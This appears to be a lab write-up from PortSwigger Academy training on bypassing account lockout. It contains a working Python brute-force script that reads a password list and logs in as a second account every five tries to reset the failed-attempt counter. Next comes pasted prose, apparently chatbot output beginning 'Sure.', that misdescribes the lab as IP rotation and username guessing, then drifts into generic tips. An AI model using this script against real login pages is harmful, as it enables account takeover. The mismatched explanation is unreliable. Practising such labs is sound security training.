# Failed attempts lockout

## Password brute forcing when failed attempt preventions are in place

In this example we will try to brute force the password for the user `carlos`
using the same technique as in the previous example, but this time the server
locks out the user after 5 failed attempts. To bypass this we will login as
`wiener:peter` and reset the failed login attempts counter.

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForcePassword:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = "carlos"

    def brute_force_password(self):
        print("🔮 Determining passwword for username", self.username)
        passwords = []
        with open("auth-broken/auth-broken-passwords") as f:
            passwords = f.readlines()
        for x, password in enumerate(passwords):
            if x % 5 == 0:
                print("Logging in as wiener to reset failed login attempts")
                self.req.post(self.args[1], data={"username": "wiener", "password": "peter"}, proxies=self.proxies, verify=False)
            print(f"Trying password: {password.strip()}❓")
            # send request with form data: username, password
            self.password = password.strip()
            self.url = self.args[1]
            self.cookies = {}
            response = self.req.post(self.url, data={"username": self.username, "password": self.password}, proxies=self.proxies, verify=False)
            if response.text and self.username in response.text:
                print(f"⚖️ Found password: {self.password}")
                with open("auth-broken-password-result", "w") as f:
                    f.write(self.password)
                break
        exit(0)

AuthBruteForcePassword().brute_force_password()
```

<a href="https://asciinema.org/a/TSJacBW5twvHpsFvDMwwfI1ST" target="_blank"><img src="https://asciinema.org/a/TSJacBW5twvHpsFvDMwwfI1ST.svg" /></a>

Sure. The Broken brute-force protection, IP block tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to brute-force attacks if it does not properly implement IP blocking.

In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.

The website has a brute-force protection mechanism in place. This mechanism blocks the IP address of any user who makes more than three failed login attempts in a row.

However, the brute-force protection mechanism is flawed in the way that it handles IP addresses. Specifically, the website does not adequately verify that the IP address is unique.

This means that an attacker could use a proxy server to rotate their IP address and bypass the brute-force protection mechanism.

To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.

Once the attacker has a list of possible usernames, they would need to use a proxy server to rotate their IP address. They would then need to submit the list of usernames to the website, one username per request. If even one of the usernames is valid, the attacker will be able to log in to the website.

The Broken brute-force protection, IP block tutorial example is a good demonstration of how a website can be vulnerable to brute-force attacks if it does not properly implement IP blocking. It is important to be aware of these vulnerabilities and to take steps to protect yourself.

Here are some tips for protecting yourself from brute-force attacks:

* Use a strong password for your online accounts.
* Enable two-factor authentication for all of your online accounts.
* Change your passwords regularly.
* Be suspicious of emails or text messages that ask for your personal information.
* Install antivirus software and keep it up to date.
* Be careful about what websites you visit and what links you click on.
* Train yourself and your employees on how to identify and avoid phishing attacks.

By following these tips, you can help to protect yourself from brute-force attacks and keep your accounts safe.

In addition to the tips above, there are a few things that the website can do to protect itself from brute-force attacks:

* Implement a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.
* Use a honeypot account to lure attackers into entering invalid credentials.
* Implement a CAPTCHA challenge to verify that the user is human.
* Monitor the website for suspicious activity, such as a large number of failed login attempts from the same IP address.

By implementing these measures, the website can help to protect itself from brute-force attacks.